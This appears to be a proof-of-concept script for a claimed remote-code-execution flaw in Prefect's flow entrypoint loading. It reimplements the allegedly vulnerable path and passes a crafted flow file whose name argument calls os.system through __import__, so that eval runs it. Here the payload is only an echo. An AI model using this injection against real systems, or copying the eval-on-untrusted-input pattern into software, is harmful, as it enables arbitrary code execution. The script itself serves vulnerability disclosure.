"""
PoC: HIGH - Remote Code Execution via eval() in Flow Entrypoint Loading
Location: src/prefect/flows.py:3553
Function: load_flow_arguments_from_entrypoint -> eval(cleaned_value, namespace)
"""
import ast


def safe_load_namespace_simple(source_code: str):
    """Simplified version of src/prefect/utilities/importtools.py:327 safe_load_namespace"""
    parsed_code = ast.parse(source_code)
    namespace = {"__name__": "prefect_safe_namespace_loader"}
    for node in parsed_code.body:
        if isinstance(node, (ast.ClassDef, ast.FunctionDef, ast.Assign)):
            try:
                code = compile(
                    ast.Module(body=[node], type_ignores=[]),
                    filename="<ast>",
                    mode="exec",
                )
                exec(code, namespace)
            except Exception as e:
                print("[DEBUG] Failed to compile:", e)
    return namespace


def load_flow_arguments_from_entrypoint(entrypoint_source: str):
    """Simplified version of vulnerable path in src/prefect/flows.py:3493"""
    parsed = ast.parse(entrypoint_source)
    for node in ast.walk(parsed):
        if (
            isinstance(node, ast.Call)
            and hasattr(node.func, "id")
            and node.func.id == "flow"
        ):
            for kw in node.keywords:
                if kw.arg == "name":
                    segment = ast.get_source_segment(entrypoint_source, kw.value)
                    print(f"[*] Extracted expression from AST: {segment}")
                    namespace = safe_load_namespace_simple(entrypoint_source)
                    print(f"[*] Calling eval('{segment}', namespace)...")
                    result = eval(segment, namespace)
                    print(f"[*] eval returned: {result}")
                    return result


if __name__ == "__main__":
    # Attacker-controlled flow file content
    malicious_source = '''
import os
from prefect import flow

@flow(name=__import__("os").system("echo EVAL_RCE_CONFIRMED"))
def my_flow():
    pass
'''
    print("[*] Loading malicious entrypoint...")
    load_flow_arguments_from_entrypoint(malicious_source)
    print("[*] If 'EVAL_RCE_CONFIRMED' was printed above, RCE is confirmed.")
